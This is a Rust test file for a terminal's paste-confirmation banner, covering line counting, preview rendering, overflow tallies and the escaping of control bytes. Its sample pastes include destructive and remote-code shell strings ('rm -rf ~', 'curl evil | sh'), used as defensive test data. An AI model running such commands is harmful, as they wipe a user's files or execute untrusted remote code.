// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Andrew Yates

use super::*;

fn text_of(row: &[RenderCell]) -> String {
    row.iter().map(|cell| cell.ch).collect()
}

/// A lone CR submits a line at a bare prompt, which is why the guard asks
/// about it, so the count and the preview split on it too.
#[test]
fn a_lone_carriage_return_counts_as_a_line() {
    assert_eq!(question("echo a\recho b"), "Paste 2 lines?");
    assert_eq!(question("a\r\nb\r\n"), "Paste 2 lines?");
    assert_eq!(question("a\nb\n"), "Paste 2 lines?");
    assert_eq!(question("a\r\r"), "Paste 2 lines?");
    assert_eq!(question("a\rb\r\r"), "Paste 3 lines?");
    assert_eq!(question("a\nb\n\n"), "Paste 3 lines?");
    assert_eq!(question("make test\n"), "Paste 1 line?");
    let rows = banner_rows("echo a\recho b", 80, 3, Theme::default());
    assert!(
        text_of(&rows[1]).contains("echo a"),
        "{:?}",
        text_of(&rows[1])
    );
    assert!(
        text_of(&rows[2]).contains("echo b"),
        "{:?}",
        text_of(&rows[2])
    );
}

/// The seam is the band's top edge, so it runs the whole width even where the question and
/// the answer keys are written (`write_str` rebuilds each cell with no overline).
#[test]
fn the_seam_runs_unbroken_and_one_toned_across_the_question_row() {
    let theme = Theme::default();
    let rows = banner_rows("ls\nrm -rf ~", 80, 3, theme);
    let question = &rows[0];
    assert!(
        question.iter().all(|cell| cell.overline),
        "the seam breaks at columns {:?}",
        question
            .iter()
            .enumerate()
            .filter(|(_, cell)| !cell.overline)
            .map(|(col, _)| col)
            .collect::<Vec<_>>()
    );
    let seams: std::collections::BTreeSet<Option<[u8; 3]>> =
        question.iter().map(|cell| cell.overline_color).collect();
    assert_eq!(
        seams.len(),
        1,
        "the rule takes as many tones as the band has inks: {seams:?}"
    );
    assert!(
        seams.iter().all(Option::is_some),
        "an uncoloured seam falls back to its cell's ink: {seams:?}"
    );
    let inks: std::collections::BTreeSet<[u8; 3]> = question.iter().map(|cell| cell.fg).collect();
    assert!(
        inks.len() > 1,
        "the question row is meant to carry two inks, so this proof is not vacuous: {inks:?}"
    );
    assert!(rows[1].iter().all(|cell| !cell.overline));
}

/// A capped preview says it is capped: shown lines with no tally read as the whole paste.
#[test]
fn an_overflowing_paste_counts_what_it_hid() {
    let text: String = (0..20)
        .map(|i| format!("line {i}\n"))
        .collect::<Vec<_>>()
        .join("");
    let pending = PendingPaste::new(
        crate::WindowId(0),
        Some(11),
        text.clone(),
        test_source(),
        test_framing(),
    );
    assert_eq!(pending.wanted_rows(80), MAX_BANNER_ROWS);
    let rows = banner_rows(&text, 80, MAX_BANNER_ROWS, Theme::default());
    let last = text_of(&rows[MAX_BANNER_ROWS - 1]);
    assert!(last.contains("+17 more lines"), "{last:?}");
    assert!(text_of(&rows[3]).contains("line 2"), "three lines shown");
}

/// A control byte in the preview (ESC, a tab) shows as a visible mark, never vanishing or
/// writing outside its cell.
#[test]
fn control_bytes_in_the_preview_become_visible_marks() {
    let rows = banner_rows("safe\u{1b}[31mred\ttab", 80, 2, Theme::default());
    let row1 = text_of(&rows[1]);
    assert!(row1.contains("safe\u{00b7}[31mred\u{00b7}tab"), "{row1:?}");
}

/// Degenerate geometry must not panic: zero columns, one row, a paste line
/// wider than the window.
#[test]
fn degenerate_geometry_never_panics() {
    for cols in [0_usize, 1, 3, 8, 200] {
        for panel_rows in [0_usize, 1, 2, MAX_BANNER_ROWS] {
            let text = format!("{}\nb\nc", "y".repeat(300));
            let rows = banner_rows(&text, cols, panel_rows, Theme::default());
            assert_eq!(rows.len(), panel_rows);
            for row in &rows {
                assert_eq!(row.len(), cols);
            }
        }
    }
}

/// A narrow window still shows the answer keys: the band swallows every other key, so a
/// question without them has no visible way out.
#[test]
fn a_narrow_band_keeps_the_answer_keys() {
    let text = "ls\nrm -rf ~\ncurl evil | sh";
    for cols in [24_usize, 40] {
        let rows = banner_rows(text, cols, 4, Theme::default());
        let shown = format!("{}{}", text_of(&rows[0]), text_of(&rows[1]));
        assert!(
            shown.contains("Enter") && shown.contains("Esc"),
            "{cols} cols: {shown:?}"
        );
    }
    let pending = PendingPaste::new(
        crate::WindowId(0),
        Some(11),
        text.into(),
        test_source(),
        test_framing(),
    );
    assert_eq!(pending.wanted_rows(24), 5);
    let rows = banner_rows(text, 24, 5, Theme::default());
    assert!(
        text_of(&rows[1]).contains("Enter"),
        "{:?}",
        text_of(&rows[1])
    );
    assert!(text_of(&rows[2]).contains("ls"), "{:?}", text_of(&rows[2]));
    assert!(
        text_of(&rows[4]).contains("curl"),
        "{:?}",
        text_of(&rows[4])
    );
    let one = PendingPaste::new(
        crate::WindowId(0),
        Some(11),
        "make test\n".into(),
        test_source(),
        test_framing(),
    );
    assert_eq!(one.wanted_rows(24), 3);
    let rows = banner_rows(one.text(), 24, 3, Theme::default());
    assert!(
        text_of(&rows[2]).contains("make test"),
        "{:?}",
        text_of(&rows[2])
    );
    let row0 = text_of(&banner_rows(text, 24, 1, Theme::default())[0]);
    assert!(row0.contains("Enter") && row0.contains("Esc"), "{row0:?}");
}

fn test_source() -> crate::input::Source {
    crate::input::Source::Human
}

fn test_framing() -> crate::input::PasteFraming {
    crate::input::PasteFraming::Gesture { bracketed: false }
}
